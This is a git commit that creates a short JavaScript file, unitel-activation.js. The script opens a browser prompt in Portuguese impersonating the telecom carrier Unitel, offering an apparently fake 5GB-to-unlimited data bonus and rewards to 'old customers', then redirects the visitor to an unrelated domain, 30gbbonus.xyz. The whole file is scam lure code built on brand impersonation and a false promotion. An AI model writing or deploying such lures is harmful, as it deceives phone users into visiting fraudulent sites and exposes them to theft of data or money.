b5b34394616f7c93e53072c5671fbd443bd026cd
xmasdata <152927198+xmasdata@users.noreply.github.com>
2024-06-03 23:08:46 -0700

    Create unitel-activation.js

---
+++ unitel-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('Unitel: Prezado cliente, por favor verifique se o seu cartão SIM Unitel está qualificado para receber de 5GB a dados ilimitados, clientes antigos Recompensa, pressione 1 para verificar agora ','1');
+if (password != '1') {
+location.href='https://30gbbonus.xyz/unitel-offer.html';
+}
